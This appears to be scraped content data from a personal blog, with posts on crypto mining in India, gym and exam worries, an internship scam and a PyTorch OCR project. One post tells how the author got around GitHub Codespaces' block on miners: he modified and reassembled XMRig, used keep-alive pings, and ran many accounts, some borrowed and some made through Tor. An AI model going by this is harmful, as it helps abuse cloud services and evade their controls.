Thoughts:**\n\nEven though this mining experiment didn’t turn into a financial win, it was a valuable learning experience. I got hands-on experience with how crypto mining works, the role of Proof of Work, and the reality of mining rewards. It was a solid reminder that while mining can be lucrative, it’s a game for those with serious hardware and low electricity costs—not casual enthusiasts with a laptop.\n\nSo, am I quitting mining? For now, yes. But did I walk away empty-handed? Not at all. Sometimes, the knowledge you gain is more valuable than the money you make.

We dived deep into Proof of Work (PoW), trying to understand how miners solve complex mathematical problems to validate transactions and secure the blockchain. The deeper we went, the more we realized how complicated but fascinating this whole thing was. It wasn’t just about setting up a machine and making money—it was about optimizing efficiency, reducing costs, and making the most out of available resources.\n\nSo, we decided to take the next step. We didn’t want to just learn; we wanted to make it real. We planned everything perfectly, right from the type of mining rigs we would buy to where we would set up our system. We calculated costs, electricity consumption, cooling requirements, and even the profitability based on different cryptos. Initially, we thought we had cracked the code—our research was so deep that we believed we could make mining more efficient than others. We figured out some unique strategies and techniques that could give us an edge over regular miners.\n\nBut here’s where reality hit us hard. The biggest problem? Electricity costs. Mining rigs consume insane amounts of power, and in India, electricity isn’t cheap. On average, residential electricity costs ₹7-10 per kWh, which completely kills profitability. Some states like Gujarat and Odisha offer industrial electricity at lower rates, but getting approvals for that isn’t easy. We thought about using solar power, but the initial investment was way beyond our budget. The more we calculated, the more we realized that whatever profits we’d make from mining would mostly go into paying electricity bills.\n\nThen came the hardware costs. If we wanted to mine Bitcoin, we needed ASIC miners, which cost anywhere between ₹1.5 lakh to ₹8 lakh per unit. GPU mining was another option, but high-end cards like the RTX 4090 or RX 7900 XTX were still around ₹1 lakh per GPU. And the heat! India’s climate isn’t friendly for mining—our rigs would overheat within hours without proper cooling. That meant extra expenses for ACs or liquid cooling setups.\n\nWe still didn’t want to give up, so we explored mining altcoins like Ethereum Classic (ETC), Ravencoin (RVN), Ergo (ERG), and Kaspa (KAS). But after Ethereum moved to Proof of Stake (PoS), GPU mining started becoming less profitable. More miners were competing for fewer rewards, and the difficulty kept increasing. We even tried experimenting with cloud mining—where you rent mining power instead of setting up hardware—but it turned out to be a waste. Most platforms charged high fees, and some were outright scams.\n\nAfter all this, we finally had our answer—mining in India just doesn’t make sense. It’s not impossible, but the conditions aren’t favorable. The electricity costs, expensive hardware, cooling requirements, and unpredictable regulations make it a risky investment. Even though we had figured out ways to make mining more efficient than others, the overall setup costs and running expenses didn’t justify the returns. If crypto prices dropped, we’d be left with machines running at a loss, burning electricity for nothing.\n\nInstead of wasting money on mining, we decided to focus on crypto investing and staking—ways to earn from crypto without dealing with electricity bills and hardware costs. It was a tough decision to let go of the mining dream, but at least we saved ourselves from a financial disaster. Maybe one day, if electricity gets cheaper or the government introduces miner-friendly policies, we’ll revisit this idea.\n\nSeeing all these challenges makes me wonder—why were we even born in this over-populated desi land with all this circus happening around? One day the government says crypto is fine, next day they slap a 30% tax, and the day after that, they start giving moral science lectures about \"digital fraud.\" And here we are, trying to do some honest mining, but between electricity bills higher than our life goals and a government that changes rules faster than WhatsApp uncles changes their DPs, we are left with nothing but broken dreams and a few fried GPUs.

After days of tweaking, bypassing restrictions, and even roping in old accounts, I managed to get it running. But reality hit hard. Between auto-shutdowns, account suspensions, and minimal earnings, the whole experiment turned out to be a massive waste of time. Lesson learned, just because something is “free” doesn’t mean it’s worth the effort.",["Date","2025-01-04T20:11:34.000Z"],[1194,9,1195,1196,1241],"It all started on an ordinary, painfully boring morning. Just another day of checking pull requests on my DevBlogs website, listening to The Weeknd's newly released song \"Timeless,\" and pretending to be productive. I usually manage my repositories using GitHub Codespaces because, let’s be real, it’s free. And free is my favorite price. Why should I waste my own laptop’s precious storage, battery life, and processing power when GitHub is generous enough to let me run all my operations on their cloud infrastructure?\n\nNow, here’s the thing. For over a year, a wild, persistent thought had been floating around in my head: “What if I mine Monero using these free cloud services?” I mean, I’m already using them daily for my development work, so why not squeeze some crypto out of them too? Back in 2023, when I first started using Codespaces, I had this exact idea, but back then, I was completely clueless about setting up mining software in a cloud environment. XMRig, the go-to mining software, is a full-fledged CLI application designed for Windows, Mac, and Linux. Obviously, running it directly on Codespaces wasn’t an option. So, I did what any rational tech enthusiast would do—I scoured every corner of the internet, watched obscure YouTube tutorials, and asked my KHC community friends. Their response?\n\n“Be practical, bro. If mining in GitHub Codespaces was possible, every MF out there would be doing it. It’s not possible. Period.”\n\nAt the time, that seemed like a fair and logical point. I laughed at my own stupidity and moved on.\n\nBut now, after using Codespaces for over a year, I had gained enough knowledge (or so I thought). I spun up a new Codespace instance, selecting the best possible configuration available—4 CPU cores, 16GB RAM, and 32GB of storage. This was the max I could get for free, and I was determined to make it work. I went all in, trying every installation method, tweaking every possible setting, bypassing every restriction I could find. And every single time, GitHub shut me down. Turns out, they had builtin restrictions that blocked any attempt to install mining software.\n\nAfter days of frustration, failed attempts, and deep discussions with my community, I had a light bulb moment. GitHub was blocking the Packed version of XMRig, but what if… I just unpacked the software, modified it slightly, and committed it to a new private repository? If I reassembled it inside Codespaces, GitHub wouldn’t even realize what was happening.\n\nBoom. It worked. Just like that, I had successfully installed XMRig in GitHub Codespaces.\n\nExcited beyond belief, I meticulously set everything up—Monero wallet, mining pool configurations, fine-tuning performance settings, the whole deal. I fired up the miner, heart pounding in anticipation, and bam! It was working. The hashrate? A solid 1.6k H/s pretty much the same as my laptop. Seeing that sweet mining reward land in my wallet was the highlight of my day.\n\nNaturally, I started crunching numbers. At 1.6k H/s, I was making around 0.0002 XMR per day, which translated to about 6 INR. Not much, but hear me out—what if I scaled this up? If I created 10 GitHub accounts, I could make 60 INR a day. That’s 1,800 INR a month, for free. And if I scaled it to 100 accounts? That’s a solid 18K per month. My inner evil genius was screaming with excitement.\n\nBut then, reality hit me like a truck.\n\nWithin 30 minutes, my Codespace shut down. My heart sank—did GitHub just ban me? Was my account flagged? Panic set in as I scrambled to check my email. Turns out, Codespaces have an auto-shutdown feature after 30 minutes of inactivity. I felt like an idiot. It took me two full days to realize this was the issue.\n\nDetermined to outsmart the system, I set up a new GitHub account and got back to work. This time, I wrote a simple bash script to keep Codespaces alive by sending a ping every 5 minutes. Boom! It worked. After running for a full 24 hours, I confirmed my rewards were coming in. Everything was looking perfect.\n\nThen, I got greedy.\n\nI started creating multiple GitHub accounts to scale up my mining operation. At around 4-5 accounts, GitHub flagged my IP and suspended all my newly created accounts. Why? Because of the unusually high CPU usage. They weren’t stupid after all. Even trying to create accounts using Tor didn’t work.\n\nSo, I switched strategies. Instead of creating new accounts, I turned to my old, inactive accounts. These weren’t flagged because they had history. I even convinced some of my friends—Deepak, Teja, and Chitesh—to lend me their unused GitHub accounts. (I didn’t dare ask my community friends because they take open-source way too seriously, and this wasn’t exactly the most ethical use of free resources.)\n\nFor two glorious days, my mining farm was alive. But then, disaster struck again. All accounts hit their free quota limit, and Codespaces shut down one by one. Just like that, my dream of passive income crumbled before my eyes.\n\nAfter crunching the numbers, I realized that even if I ran this on 10 accounts for 2 days, I’d only make about 0.0017 XMR roughly 35 INR. And after that, I’d have to either wait for the monthly quota to reset or find new accounts.\n\nTotal waste of time.\n\nStill, the experiment was fun. I even tried mining on Google Cloud, AWS EC2, and because I love wasting time—Google Colab. None of them were worth the effort. The hash rates were disappointingly low, and cloud providers had even stricter monitoring than GitHub.\n\nSo yeah, mining Monero on free cloud services? Technically possible. But practically? Unless you have an army of aged, unused GitHub accounts at your disposal, it’s a complete waste of time.\n\nJust because something is “free” doesn’t mean it’s worth the effort.

I told him straight up—this gym doesn’t allow outsiders unless referred. But he wouldn’t stop. Every day, it was the same thing—\"Bro, ask your trainer,\" \"Bro, give me his number.\" I wasn’t comfortable bringing him in, but just to shut him up, I called my trainer right in front of him, hoping he’d say no. But no, my bad luck—Jyothiram sir said, \"Bring him, I’ll see.\" Damn.\n\n  So, Teja joins, and just like that, my whole training schedule is ruined. What used to take me two hours is now stretching to three. I start skipping cardio just to keep up. And the worst part? I have to pick him up from home, train with him, and then drop him back. I’m leaving at 4:30 PM and getting home at 7:30 PM, completely drained and irritated.\n\n  Then enters Manoj, another new guy at the gym. At first, it was chill. One day, Teja took a week off for his birthday trip, and I finally had some peace. I was getting my workouts done quickly again. But then Manoj started asking me to check his form. Fine, I helped. After two days, he took my number and started calling me—\"When are you coming, bro?\"\n\n  Now, he’s 10 years older than me, so out of respect, I responded. But then he started insisting I train in the morning—9 AM to 11 AM—because the gym would be empty. I tried it once, and yeah, the session was smooth. But soon, I realized I was spending 3-4 hours there just because there was no crowd and this guy kept talking between sets. My entire morning was gone.\n\n  Now, fast forward to March 1, 2025. Two months down, I’ve barely completed my first workout cycle. I’ve wasted so much time—thanks to Teja, Manoj, and this unnecessary socializing.

From March 3, I’m cutting out all distractions, fixing my schedule, and balancing both gym and my own stuff. No more nonsense.\n\n  **New plan, new mindset, no time waste.**\n\n  But the good thing is, I gained weight, reduced my body fat, and kept all my health metrics in check. I stuck to a proper diet with enough protein and carbs as per my needs. These two months were productive in terms of fitness, and I’m satisfied with that.

I need to prepare for this stupid IELTS exam. I have already wasted three months doing nothing, and now I feel like I need to get back on track. After that whole mess with my TOEFL exam on November 13, I just gave up on everything. I stopped studying, stopped planning, stopped caring about what I was supposed to do next. Instead, I just focused on completing my 4th-year 1st-semester exams. That was the only thing I did properly. Those exams ended in December 2024, and after that, I found myself stuck in the same cycle again—questioning everything, overthinking every little thing, just like always.\n\nDo I really want to study? Is it even important? All these years, I never really thought about it. I just went with whatever came my way. But this time, I don’t want to go anywhere just for the sake of studying. Last time, I made a huge mistake—one that changed my entire life. I didn’t join the same college as her, and honestly, that decision still haunts me. I was scared. I thought if I joined, I would get too attached, and I didn’t want to ruin things. But looking back, I realize that was the worst decision I ever made. If I had joined, at least I would have been around her, and maybe things would have been different. Maybe I wouldn’t have spent all these years feeling like this.\n\nSo now, if I have to decide on going somewhere for studies, I can’t make the same mistake again. This time, I need to be sure. If I leave again, I know for sure that everything will be over. There will be no turning back. So, before I make a decision, I decided to ask her—just to get her opinion, just to see what she thinks.\n\nIt’s not really about whether she gives me good advice or not. It’s more about understanding where she stands. If she really cares about us, she will definitely tell me not to go. If she tells me to go, saying it’s a good option and it’s my life, my choice—then that’s it. That means she doesn’t care, and I should just go and never disturb her again. But if she tries to explain things properly, thinking practically and telling me not to waste my time on unnecessary things, then maybe she does care. Maybe she’s just unable to say it directly. If she takes time to explain things to me, to make me understand, then at least I will know that she still has some concern for me.\n\nBut if she just gives me dry, uninterested replies like always, then that will be the final confirmation that she doesn’t even care to talk to me, and she’s just pretending to reply out of formality.\n\nSo, to test this, I sent her a message today. I just typed, “Free vunapudu hloo petu, call cheysta” so that I could see how she reacts. Is she even interested in talking? Or is she just replying for the sake of it? I know her well. If she replies with “Sorry ra”, then I know exactly what will happen next. She will see my message, ignore it for a while, and then reply whenever she feels like it. That’s how she always does it.\n\n![Screenshot](https://raw.githubusercontent.com/ekrishnachaitanya2004/Krishna-Site-Doc/refs/heads/main/15MAR2025/Screenshot%202025-03-15%20at%203.15.39%E2%80%AFPM.png)\n\nIt’s frustrating because I don’t even know why I keep doing this. Why do I keep waiting for something that is never going to happen? Why do I keep trying to make sense of things when I already know the truth? But still, a small part of me hopes. Hopes that maybe, just maybe, she will reply differently this time.\n\nLet’s see what happens.","src/content/blogs/Stopagain2025.md","f77cbeff675b371b",{"html":1518,"metadata":1519},"\u003Cp>I want to stop everything again and go back to my daily routine.

Last time, I made a huge mistake—one that changed my entire life. I didn’t join the same college as her, and honestly, that decision still haunts me. I was scared. I thought if I joined, I would get too attached, and I didn’t want to ruin things. But looking back, I realize that was the worst decision I ever made. If I had joined, at least I would have been around her, and maybe things would have been different. Maybe I wouldn’t have spent all these years feeling like this.\u003C/p>\n\u003Cp>So now, if I have to decide on going somewhere for studies, I can’t make the same mistake again. This time, I need to be sure. If I leave again, I know for sure that everything will be over. There will be no turning back. So, before I make a decision, I decided to ask her—just to get her opinion, just to see what she thinks.\u003C/p>\n\u003Cp>It’s not really about whether she gives me good advice or not. It’s more about understanding where she stands. If she really cares about us, she will definitely tell me not to go. If she tells me to go, saying it’s a good option and it’s my life, my choice—then that’s it. That means she doesn’t care, and I should just go and never disturb her again. But if she tries to explain things properly, thinking practically and telling me not to waste my time on unnecessary things, then maybe she does care. Maybe she’s just unable to say it directly. If she takes time to explain things to me, to make me understand, then at least I will know that she still has some concern for me.\u003C/p>\n\u003Cp>But if she just gives me dry, uninterested replies like always, then that will be the final confirmation that she doesn’t even care to talk to me, and she’s just pretending to reply out of formality.\u003C/p>\n\u003Cp>So, to test this, I sent her a message today. I just typed, “Free vunapudu hloo petu, call cheysta” so that I could see how she reacts. Is she even interested in talking? Or is she just replying for the sake of it? I know her well. If she replies with “Sorry ra”, then I know exactly what will happen next. She will see my message, ignore it for a while, and then reply whenever she feels like it. That’s how she always does it.\u003C/p>\n\u003Cp>\u003Cimg src=\"https://raw.githubusercontent.com/ekrishnachaitanya2004/Krishna-Site-Doc/refs/heads/main/15MAR2025/Screenshot%202025-03-15%20at%203.15.39%E2%80%AFPM.png\" alt=\"Screenshot\">\u003C/p>\n\u003Cp>It’s frustrating because I don’t even know why I keep doing this.

Every meal, every comfort I had—it wasn’t mine, it was theirs. They worked tirelessly to make sure I had a life they never did, that I didn’t have to go through the same hardships they endured. I’ve seen the sacrifices they made, the way they gave up their own happiness just to secure mine. They spent their entire youth ensuring that my brother and I never felt the weight of the world too soon. And now, when it’s finally my turn, should I just turn my back on them and build another family while they grow old waiting for the same love they once gave me? No. I can’t. I won’t.\n\nMarriage? It’s just a cycle—one that forces you into a system where you work not for yourself, not for your dreams, but just to keep a family afloat. You wake up every morning, not because you want to, but because you have to. Your entire existence becomes about earning, saving, providing, and sacrificing. But what about me? My dreams? My happiness?\n\nIf I get married, I don’t just gain a wife—I gain lifelong responsibilities. A house to run, a family to provide for, a future to secure—not just for me, but for my wife and kids.

I’ve seen this happen to people around me. Marriages that started with love but ended in stress, compromise, and regrets. I refuse to be that person.\n\nPeople say, “Now women work too. Life won’t be as hard.” But that’s not how I see it. If I marry someone, she’s my responsibility. If I married Harshi, why should she have to work? She’s a queen. She deserves a life where she doesn’t have to worry about anything. She should be able to wake up and live freely, without stress, without burdens.

Don’t fall for them.\" Then I hung up.\n\nLater that evening, he called again. This time, I ignored it. But then my mom came in and said, \"Teja is waiting for you at the gate.\" So, I casually went outside and asked him the usual small talk—how life was going and all that.\n\nAnd then, he started the same nonsense from the morning.\n\nI told him straight up, \"First of all, I have zero interest in this so-called job or internship. Second, don’t even call it an internship—it’s just a course with a certificate, not real experience. I’m studying to meet society’s expectations because, in the end, people value a degree on paper more than actual skills and worth.\"\n\nThen he finally told me the real reason.\n\nHis girlfriend was working at that company in Bangalore as an intern, and her company was forcing her to hit a target—getting at least 10 people to sign up by the end of the day. She was in serious trouble, so she asked him to bring in some friends.\n\nAt that moment, everything clicked. My gut feeling was right. It was a scam—a fake company collecting money under the name of \"internships.\"\n\nI’ve dealt with these things before. But even when I’ve done similar stuff, I never took a single rupee from anyone—I always shared knowledge for free. (Check out my [Snakes and Networks](#) blog for more on that.) So yeah, I knew exactly what was going on, and I was fully aware of how these fake startups and internship scams operate.\n\nAfter explaining everything to him, I decided to pay the internship fee—just for the sake of our friendship. I told him, \"Go home, we’ll schedule it for tomorrow at 10 AM.\" But he kept pushing me to join immediately.\n\nAt this point, my intention was clear—I was going to check everything about this so-called \"internship\" and report it as a scam to the relevant authorities. To me, everything looks like a legit business until people start questioning it. That’s when you realize it’s a scam.\n\nAnyway, he wasn’t leaving. So, I just paid the money. He finally relaxed and went home.\n\nThen he told me to message his girlfriend with the payment screenshot for registration.\nI sent a simple \"Hello.\" She replied, asking for my full name, then sent me the company details:\n\n*\"Hey,*\\\n*I am Pravinya Rayalapati, Senior Executive from AICTE Org of 1Stop.ai, an education partner of E-Cell IIT Roorkee.\"*\n\nI forwarded this to my friend Santo, who was completely shocked. When I explained everything to him, his shock turned into disbelief. \"I’ve never seen anything like this in my country,\" he said, shaking his head. I just laughed and replied, \"Bro, welcome to India—where you're either celebrating a festival or dodging a scam. No wonder every MNC treats us like their favorite playground for both sales and shady schemes!\"\n\nShe then sent me the registration link. I filled out everything and submitted the ₹1750 INR payment. The transaction was done, Teja was happy.\n\nI knew it was a scam, but I went through with it just for Teja. I wanted him to realize that this wasn’t the right way to build a career. He was only doing it for his girlfriend, and while that was his choice, it had nothing to do with me. He asked me to pay, so I did—end of story.\n\nThat’s it. I’m done with this. I don’t wanna be involved anymore.\n\nAfter a day, he told me he had gotten more than 50 people to join just for her. See, he did it all for a girl—how stupid! I told him straight up that she was just using him for her work. I advised him to stay away from this trash and never do something like this for a girl again. I told him, \"She’s using you now, but once her work is done, she won’t care about you at all. In the end, you’re just another number in her report, and once she meets her target, you’ll be forgotten.&#x20;\n\nFinally, it's none of my business, so I don’t care about him or his relationship. I just hope I never fall for this trap again, even if it were for a close friend.\n\nFolder - [Scam Teja](https://github.com/ekrishnachaitanya2004/Krishna-Site-Doc/tree/main/SCAMTEJA)","src/content/blogs/SCAMTEJA.md","129c06dcabf8be00",{"html":1585,"metadata":1586},"\u003Cp>It was July 2, 2024.

I joined this internship—can you join too? Just for me?”\u003C/p>\n\u003Cp>I immediately shut him down. “Dude, don’t ever call me for this kind of crap. These so-called internships are scams. Don’t fall for them.” Then I hung up.\u003C/p>\n\u003Cp>Later that evening, he called again. This time, I ignored it. But then my mom came in and said, “Teja is waiting for you at the gate.” So, I casually went outside and asked him the usual small talk—how life was going and all that.\u003C/p>\n\u003Cp>And then, he started the same nonsense from the morning.\u003C/p>\n\u003Cp>I told him straight up, “First of all, I have zero interest in this so-called job or internship. Second, don’t even call it an internship—it’s just a course with a certificate, not real experience. I’m studying to meet society’s expectations because, in the end, people value a degree on paper more than actual skills and worth.”\u003C/p>\n\u003Cp>Then he finally told me the real reason.\u003C/p>\n\u003Cp>His girlfriend was working at that company in Bangalore as an intern, and her company was forcing her to hit a target—getting at least 10 people to sign up by the end of the day. She was in serious trouble, so she asked him to bring in some friends.\u003C/p>\n\u003Cp>At that moment, everything clicked. My gut feeling was right. It was a scam—a fake company collecting money under the name of “internships.”\u003C/p>\n\u003Cp>I’ve dealt with these things before. But even when I’ve done similar stuff, I never took a single rupee from anyone—I always shared knowledge for free. (Check out my \u003Ca href=\"#\">Snakes and Networks\u003C/a> blog for more on that.) So yeah, I knew exactly what was going on, and I was fully aware of how these fake startups and internship scams operate.\u003C/p>\n\u003Cp>After explaining everything to him, I decided to pay the internship fee—just for the sake of our friendship. I told him, “Go home, we’ll schedule it for tomorrow at 10 AM.” But he kept pushing me to join immediately.\u003C/p>\n\u003Cp>At this point, my intention was clear—I was going to check everything about this so-called “internship” and report it as a scam to the relevant authorities. To me, everything looks like a legit business until people start questioning it. That’s when you realize it’s a scam.\u003C/p>\n\u003Cp>Anyway, he wasn’t leaving. So, I just paid the money. He finally relaxed and went home.\u003C/p>\n\u003Cp>Then he told me to message his girlfriend with the payment screenshot for registration.\nI sent a simple “Hello.” She replied, asking for my full name, then sent me the company details:\u003C/p>\n\u003Cp>\u003Cem>“Hey,\u003C/em>\u003Cbr>\n\u003Cem>I am Pravinya Rayalapati, Senior Executive from AICTE Org of 1Stop.ai, an education partner of E-Cell IIT Roorkee.”\u003C/em>\u003C/p>\n\u003Cp>I forwarded this to my friend Santo, who was completely shocked. When I explained everything to him, his shock turned into disbelief. “I’ve never seen anything like this in my country,” he said, shaking his head. I just laughed and replied, “Bro, welcome to India—where you’re either celebrating a festival or dodging a scam. No wonder every MNC treats us like their favorite playground for both sales and shady schemes!”\u003C/p>\n\u003Cp>She then sent me the registration link. I filled out everything and submitted the ₹1750 INR payment. The transaction was done, Teja was happy.\u003C/p>\n\u003Cp>I knew it was a scam, but I went through with it just for Teja. I wanted him to realize that this wasn’t the right way to build a career. He was only doing it for his girlfriend, and while that was his choice, it had nothing to do with me. He asked me to pay, so I did—end of story.\u003C/p>\n\u003Cp>That’s it. I’m done with this. I don’t wanna be involved anymore.\u003C/p>\n\u003Cp>After a day, he told me he had gotten more than 50 people to join just for her. See, he did it all for a girl—how stupid! I told him straight up that she was just using him for her work. I advised him to stay away from this trash and never do something like this for a girl again. I told him, “She’s using you now, but once her work is done, she won’t care about you at all. In the end, you’re just another number in her report, and once she meets her target, you’ll be forgotten. \u003C/p>\n\u003Cp>Finally, it’s none of my business, so I don’t care about him or his relationship. I just hope I never fall for this trap again, even if it were for a close friend.\u003C/p>\n\u003Cp>Folder - \u003Ca href=\"https://github.com/ekrishnachaitanya2004/Krishna-Site-Doc/tree/main/SCAMTEJA\">Scam Teja\u003C/a>\u003C/p>",{"headings":1587,"localImagePaths":1588,"remoteImagePaths":1589,"frontmatter":1590,"imagePaths":1594},[],[],[],{"author":17,"pubDatetime":1591,"modDatetime":1592,"title":1574,"slug":1571,"featured":24,"draft":24,"tags":1593,"description":1575},["Date","2024-07-08T09:23:00.000Z"],["Date","2024-07-08T10:11:34.400Z"],[1578,1579,771,772,1148,1580],[],"IPod",{"id":1595,"data":1597,"body":1604,"filePath":1605,"digest":1606,"rendered":1607},{"title":1598,"description":1599,"pubDatetime":1600,"author":17,"tags":1601,"draft":24,"featured":24,"slug":1595,"emoji":25,"pubDate":1600},"A Year’s End, A Sentimental Crisis, and an iPod Fix","A nostalgic year-end cleanup turned into a high-stakes mission to revive my 16-year-old iPod.

I still have two backlogs to clear, but now I’m in the first semester of my second year. Looking back, this year was full of different experiences—some good, some not so great.  \n\nIt all started in Tirupati. My daily routine was simple—wake up at 7 AM, get ready, and catch the college bus at 8:30 AM with my friend Shashank. In college, I hardly paid attention to lectures. The theoretical subjects never really interested me, so I spent most of my time scrolling through Twitter, reading articles, or sometimes even looking up the same topics being taught, but in my own way. Mostly, I was just waiting for the lunch break—not for food, but to play *Free Fire* with my friend. We played non-stop, skipping meals and ignoring everything else.  \n\nAfternoons were unpredictable. Sometimes, we stayed in class, sometimes we skipped and went home to play *Uncharted*. Evenings were the best part of my day. I would meet my friends—Nitheesh, Jaswanth, and Pawan—and we would roam the outskirts of Tirupati, sit around SV University, and just talk. About life, random things, anything that came to mind. I would return home late at night, sleep, and repeat the same routine the next day.  \n\nBut after May 2022, things changed. We moved to Srikalahasthi because of my father (I’ll write about that another time). Life became different. Now, I had to wake up at 5 AM, go for a quick 2K run, freshen up, eat, and rush to catch the college bus by 7 AM. The ride was about 45 minutes. In college, my routine was the same—scrolling, reading, chatting. But here, I couldn’t skip class. If I left, I wouldn’t be able to get back in, and that meant missing my bus home. So, I spent my free time in the library, played games, or just walked around.  \n\nOne good thing about moving was meeting a new friend—another Nitheesh. He was a lot like me, maybe even more curious. He loved tech, was crazy about physics, and was a professional badminton player who competed in tournaments every month. Our bus rides home were always interesting—we talked about all sorts of things, and it never got boring.  \n\nAt home, life was structured—early sleep, no junk food, and homemade meals. In a way, things were smooth. But even with everything going fine, one thing always bothered me—I didn’t like staying in Srikalahasthi.  \n\nWalking through the same streets every day, passing by places filled with memories of Harshi—it made me feel uneasy.

I still have two backlogs to clear, but now I’m in the first semester of my second year. Looking back, this year was full of different experiences—some good, some not so great.\u003C/p>\n\u003Cp>It all started in Tirupati. My daily routine was simple—wake up at 7 AM, get ready, and catch the college bus at 8:30 AM with my friend Shashank. In college, I hardly paid attention to lectures. The theoretical subjects never really interested me, so I spent most of my time scrolling through Twitter, reading articles, or sometimes even looking up the same topics being taught, but in my own way. Mostly, I was just waiting for the lunch break—not for food, but to play \u003Cem>Free Fire\u003C/em> with my friend. We played non-stop, skipping meals and ignoring everything else.\u003C/p>\n\u003Cp>Afternoons were unpredictable. Sometimes, we stayed in class, sometimes we skipped and went home to play \u003Cem>Uncharted\u003C/em>. Evenings were the best part of my day. I would meet my friends—Nitheesh, Jaswanth, and Pawan—and we would roam the outskirts of Tirupati, sit around SV University, and just talk. About life, random things, anything that came to mind. I would return home late at night, sleep, and repeat the same routine the next day.\u003C/p>\n\u003Cp>But after May 2022, things changed. We moved to Srikalahasthi because of my father (I’ll write about that another time). Life became different. Now, I had to wake up at 5 AM, go for a quick 2K run, freshen up, eat, and rush to catch the college bus by 7 AM. The ride was about 45 minutes. In college, my routine was the same—scrolling, reading, chatting. But here, I couldn’t skip class. If I left, I wouldn’t be able to get back in, and that meant missing my bus home. So, I spent my free time in the library, played games, or just walked around.\u003C/p>\n\u003Cp>One good thing about moving was meeting a new friend—another Nitheesh. He was a lot like me, maybe even more curious. He loved tech, was crazy about physics, and was a professional badminton player who competed in tournaments every month. Our bus rides home were always interesting—we talked about all sorts of things, and it never got boring.\u003C/p>\n\u003Cp>At home, life was structured—early sleep, no junk food, and homemade meals. In a way, things were smooth. But even with everything going fine, one thing always bothered me—I didn’t like staying in Srikalahasthi.\u003C/p>\n\u003Cp>Walking through the same streets every day, passing by places filled with memories of Harshi—it made me feel uneasy. It was like being trapped in the past, thinking about things I wanted to forget. No matter what I did, that feeling never went away.\u003C/p>\n\u003Cp>Now, my second year has started.

While optical character recognition (OCR) for printed text is common, recognizing handwritten text presents unique challenges due to the diversity in handwriting styles. In this blog post, I'll walk you through my journey of building an image-to-text converter that can recognize handwritten text, leveraging the power of PyTorch for custom model training.\n\n## Project Overview\n\nThis project is a Flask-based web application that allows users to upload images containing text, which is then converted into digital text. The real challenge lies in enabling the app to accurately recognize handwritten text. To achieve this, I trained a custom model using PyTorch, focusing on a Convolutional Recurrent Neural Network (CRNN) architecture to handle the complexity of handwritten characters.\n\n## Key Features\n- **Custom Handwritten Text Recognition**: Trained a PyTorch model on a dataset of handwritten text images.\n- **lask Web Application**: A simple and intuitive interface where users can upload images and receive the corresponding text output.\n- **Deployment**: The application is deployed on Heroku and integrated with my GitHub Pages site for easy access.\n\n## Step-by-Step Development\n1. **Dataset Collection and Preparation**\nThe first step in any machine learning project is gathering and preparing the dataset. For handwritten text recognition, I needed a diverse set of handwritten samples. I considered using existing datasets like the IAM Handwriting Database but also gathered additional samples to train the model on various handwriting styles.\n\nData Preprocessing:\nEach image was resized and normalized to a consistent size. I also applied data augmentation techniques like rotation, scaling, and adding noise to improve the model's robustness.\n\n2. **Building the PyTorch Model**\nFor handwritten text recognition, I opted for a Convolutional Recurrent Neural Network (CRNN) architecture. This approach combines the feature extraction capabilities of Convolutional Neural Networks (CNNs) with the sequential processing power of Recurrent Neural Networks (RNNs).\n\nCNN: Extracts features from the input image, such as edges and textures.\nRNN (LSTM/GRU): Processes these features over time, allowing the model to understand the sequence of characters in the text.\n\nHere's a simplified version of the model:\n\n```python\nimport torch.nn as nn\n\nclass CRNN(nn.Module):\n    def __init__(self, imgH, nc, nclass, nh):\n        super(CRNN, self).__init__()\n        self.cnn = nn.Sequential(\n            nn.Conv2d(nc, 64, 3, 1, 1),\n            nn.ReLU(True),\n            nn.MaxPool2d(2, 2),\n            nn.Conv2d(64, 128, 3, 1, 1),\n            nn.ReLU(True),\n            nn.MaxPool2d(2, 2),\n            nn.Conv2d(128, 256, 3, 1, 1),\n            nn.ReLU(True),\n            nn.MaxPool2d(2, 2)\n        )\n        self.rnn = nn.Sequential(\n            nn.LSTM(256, nh, bidirectional=True),\n            nn.Linear(nh * 2, nclass)\n        )\n\n    def forward(self, x):\n        x = self.cnn(x)\n        x = x.squeeze(2)\n        x = x.permute(2, 0, 1)\n        x, _ = self.rnn(x)\n        return x\n```\n\n3. **Training the Model**\nTraining the model was a critical step. I used the Connectionist Temporal Classification (CTC) loss, which is well-suited for sequence-based tasks like text recognition. The model was trained over several epochs, fine-tuning hyperparameters like learning rate and batch size to improve accuracy.\n\n4. **Integrating with Flask**\nOnce the model was trained, I integrated it into a Flask web application. The app allows users to upload an image, which is processed by the model to output the recognized text. Flask makes it easy to handle user inputs, process images, and display results.\n\n```python\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST':\n        file = request.files['file']\n        if file:\n            image = Image.open(file.stream).convert('L')\n            text = pytesseract.image_to_string(image)\n            return render_template('index.html', extracted_text=text)\n    return render_template('index.html')\n```\n\n5. **Deploying the Application**\nFor deployment, I chose Heroku, a cloud platform that supports easy deployment of Flask applications. The deployment process involved creating a Procfile, specifying dependencies in requirements.txt, and setting up automatic deployment through GitHub Actions.\n\n```bash\nweb: gunicorn main:app\n```\n\nThis setup ensures that the application is accessible online, and updates are automatically deployed whenever I push changes to the GitHub repository.\n\n6. **Linking to GitHub Pages**\nTo make the app easily accessible, I linked it from my GitHub Pages site. This allows users to visit my website and access the image-to-text converter directly.\n\n## Challenges and Learnings\n\nOne of the biggest challenges was handling the variability in handwriting styles. No two individuals write the same way, and this diversity can make recognition difficult. By applying data augmentation and experimenting with different model architectures, I was able to improve the model's accuracy significantly.\n\nAnother challenge was optimizing the model for deployment. Since the model needs to be lightweight and fast, I had to balance complexity with performance, ensuring that the app runs smoothly on Heroku.\n\n## Conclusion\n\nBuilding an image-to-text converter with handwritten text recognition was a rewarding experience. It combined my interests in machine learning, web development, and cloud deployment into a single project. This project not only helped me deepen my understanding of PyTorch and Flask but also gave me a glimpse into the challenges of real-world OCR tasks.\n\nFeel free to try out the Image-to-Text Converter and explore the code on my GitHub repository https://github.com/ekrishnachaitanya2004/Image-to-text-Converter.git.","src/content/blogs/blog3.md","cc12cd985b0d0c2a",{"html":1718,"metadata":1719},"\u003Ch2 id=\"introduction\">Introduction\u003C/h2>\n\u003Cp>In the era of digitization, converting images to text has become a vital technology for various applications, including digitizing handwritten notes, automating form processing, and enabling accessibility features.

